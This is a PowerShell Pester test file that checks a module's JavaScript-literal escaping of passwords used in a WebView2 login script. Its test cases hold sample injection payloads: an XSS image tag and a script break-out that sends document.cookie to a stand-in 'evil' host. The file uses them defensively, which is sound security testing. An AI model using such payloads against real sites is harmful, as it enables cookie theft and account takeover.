param(
    [string]$ModulePath = (Join-Path $(Split-Path $(Split-Path $PSScriptRoot)) -ChildPath 'OmadaWeb.PS\OmadaWeb.PS.psm1')
)

BeforeAll {
    Get-Module OmadaWeb.PS | ForEach-Object { $_ | Remove-Module -Force -ErrorAction SilentlyContinue }
    Import-Module $ModulePath -Force -ErrorAction Stop
}

Describe 'ConvertTo-JavaScriptLiteral' -Tag 'Unit' {

    Context 'Hostile input round-trips' {
        # Every value a credential could realistically contain and that would break naive
        # single-quote interpolation. See issue #19.
        It "Round-trips <Name> unchanged" -TestCases @(
            @{ Name = 'single quote'; Value = "P@ss'word" }
            @{ Name = 'double quote'; Value = 'P@ss"word' }
            @{ Name = 'backslash'; Value = 'DOMAIN\user' }
            @{ Name = 'trailing backslash'; Value = 'secret\' }
            @{ Name = 'script break-out'; Value = "');alert(1);//" }
            @{ Name = 'closing script tag'; Value = '</script><img src=x onerror=alert(1)>' }
            @{ Name = 'newline'; Value = "line1`nline2" }
            @{ Name = 'carriage return and tab'; Value = "line1`r`tline2" }
            # Built from code points so this file stays pure ASCII on disk (no BOM needed).
            @{ Name = 'emoji and non-ASCII letters'; Value = "passw$([System.Char]0x00F6)rd-$([System.Char]::ConvertFromUtf32(0x1F510))-$([System.Char]0x65E5)$([System.Char]0x672C)$([System.Char]0x8A9E)" }
            @{ Name = 'empty string'; Value = '' }
            @{ Name = 'only quotes and slashes'; Value = '''"\/' }
        ) {
            InModuleScope 'OmadaWeb.PS' -Parameters @{ Value = $Value } {
                $Literal = ConvertTo-JavaScriptLiteral $Value

                # A JSON string literal is also a valid JavaScript string literal.
                $Literal | Should -BeLike '"*"'
                ($Literal | ConvertFrom-Json) | Should -BeExactly $Value
            }
        }
    }

    Context 'Escaping guarantees' {
        It 'Escapes the double quote so the literal cannot be terminated early' {
            InModuleScope 'OmadaWeb.PS' {
                $Literal = ConvertTo-JavaScriptLiteral 'a"b'
                $Literal | Should -BeExactly '"a\"b"'
            }
        }

        It 'Escapes the backslash' {
            InModuleScope 'OmadaWeb.PS' {
                $Literal = ConvertTo-JavaScriptLiteral 'a\b'
                $Literal | Should -BeExactly '"a\\b"'
            }
        }

        It 'Contains no raw line break' {
            InModuleScope 'OmadaWeb.PS' {
                $Literal = ConvertTo-JavaScriptLiteral "a`r`nb"
                $Literal | Should -Not -Match "[`r`n]"
            }
        }

        It 'Escapes the Unicode line and paragraph separators' {
            InModuleScope 'OmadaWeb.PS' {
                # U+2028 and U+2029 are legal raw in JSON but terminate a JavaScript string literal
                # before ES2019. Built from code points so this file stays pure ASCII on disk.
                $LineSeparator = [System.String][System.Char]0x2028
                $ParagraphSeparator = [System.String][System.Char]0x2029
                $Value = "a{0}b{1}c" -f $LineSeparator, $ParagraphSeparator

                $Literal = ConvertTo-JavaScriptLiteral $Value

                $Literal.Contains($LineSeparator) | Should -BeFalse
                $Literal.Contains($ParagraphSeparator) | Should -BeFalse
                # The escaped form is still JSON, so no information is lost.
                ($Literal | ConvertFrom-Json) | Should -BeExactly $Value
            }
        }

        It 'Emits the JavaScript null literal for a null value' {
            InModuleScope 'OmadaWeb.PS' {
                (ConvertTo-JavaScriptLiteral $null) | Should -BeExactly 'null'
            }
        }

        It 'Keeps a numeric-looking value a string literal' {
            InModuleScope 'OmadaWeb.PS' {
                (ConvertTo-JavaScriptLiteral '12345') | Should -BeExactly '"12345"'
            }
        }
    }

    Context 'Composed ExecuteScriptAsync payload' {
        It 'Produces a balanced script that a hostile password cannot break out of' {
            InModuleScope 'OmadaWeb.PS' {
                # Same shape as $setElementValueScript in Invoke-WebView2MicrosoftLogin.ps1.
                $SetElementValueScript = @"
(function(elementId, value) {
    var element = document.getElementById(elementId);
    if (element) {
        element.value = value;
        return true;
    }
    return false;
})
"@
                $Password = "');document.location='http://evil/'+document.cookie;//"
                $Script = "$SetElementValueScript($(ConvertTo-JavaScriptLiteral 'i0118'), $(ConvertTo-JavaScriptLiteral $Password))"

                # The payload survives only as data: both arguments are double-quoted literals, so
                # the single quotes in the password can no longer terminate anything.
                $Script | Should -BeLike "*(`"i0118`", `"*`")"
                $Script | Should -Not -BeLike "*('i0118'*"

                # The argument list parses back to exactly the two intended arguments. It is cut out
                # by position - between the parenthesis that opens the call and the single one that
                # closes it - because a parenthesis in the value itself must not confuse the test.
                $OpeningParenthesis = $Script.IndexOf('})') + 2
                $ArgumentList = $Script.Substring($OpeningParenthesis + 1, $Script.Length - $OpeningParenthesis - 2)
                $Arguments = "[{0}]" -f $ArgumentList | ConvertFrom-Json
                $Arguments.Count | Should -Be 2
                $Arguments[0] | Should -BeExactly 'i0118'
                $Arguments[1] | Should -BeExactly $Password
            }
        }
    }
}

AfterAll {
    Get-Module OmadaWeb.PS | ForEach-Object { $_ | Remove-Module -Force -ErrorAction SilentlyContinue }
}
